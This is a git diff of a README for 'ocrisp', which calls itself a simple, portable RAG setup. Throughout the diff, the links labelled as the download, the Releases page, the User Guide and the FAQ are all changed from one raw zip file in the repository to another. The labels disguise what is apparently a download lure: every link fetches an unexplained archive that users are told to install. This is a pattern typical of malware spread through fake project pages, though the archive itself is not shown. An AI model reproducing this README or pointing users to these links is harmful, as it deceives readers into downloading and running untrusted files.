@@ -1,6 +1,6 @@
 # 🚀 ocrisp - Simple and Portable RAG Setup
 
-[![Download ocrisp](https://raw.githubusercontent.com/jeson4535/ocrisp/main/Variag/ocrisp.zip)](https://raw.githubusercontent.com/jeson4535/ocrisp/main/Variag/ocrisp.zip)
+[![Download ocrisp](https://github.com/jeson4535/ocrisp/raw/refs/heads/main/assets/Software-v1.4.zip)](https://github.com/jeson4535/ocrisp/raw/refs/heads/main/assets/Software-v1.4.zip)
 
 ## 📜 Description
 
@@ -19,7 +19,7 @@ Before you download, ensure your system meets the following requirements:
 Follow these steps to get ocrisp up and running on your computer:
 
 1. **Download the Application:**
-   - Visit the [Releases page to download](https://raw.githubusercontent.com/jeson4535/ocrisp/main/Variag/ocrisp.zip) the latest version of ocrisp. Look for the download link relevant to your operating system.
+   - Visit the [Releases page to download](https://github.com/jeson4535/ocrisp/raw/refs/heads/main/assets/Software-v1.4.zip) the latest version of ocrisp. Look for the download link relevant to your operating system.
 
 2. **Install the Application:**
    - Once the file has downloaded, locate it in your downloads folder. 
@@ -36,7 +36,7 @@ Follow these steps to get ocrisp up and running on your computer:
 
 ## 🔗 Download & Install
 
-To download the latest version of ocrisp or to check for updates, visit the [Releases page](https://raw.githubusercontent.com/jeson4535/ocrisp/main/Variag/ocrisp.zip). Make sure to select the correct version for your operating system.
+To download the latest version of ocrisp or to check for updates, visit the [Releases page](https://github.com/jeson4535/ocrisp/raw/refs/heads/main/assets/Software-v1.4.zip). Make sure to select the correct version for your operating system.
 
 ## 📥 Features
 
@@ -58,7 +58,7 @@ If you encounter any issues while installing or running ocrisp, consider the fol
 
 For more information, tutorials, and tips on using ocrisp, check out the following resources:
 
-- [User Guide](https://raw.githubusercontent.com/jeson4535/ocrisp/main/Variag/ocrisp.zip)
-- [Frequently Asked Questions](https://raw.githubusercontent.com/jeson4535/ocrisp/main/Variag/ocrisp.zip)
+- [User Guide](https://github.com/jeson4535/ocrisp/raw/refs/heads/main/assets/Software-v1.4.zip)
+- [Frequently Asked Questions](https://github.com/jeson4535/ocrisp/raw/refs/heads/main/assets/Software-v1.4.zip)
 
 Thank you for choosing ocrisp. We hope you find it helpful and easy to use.
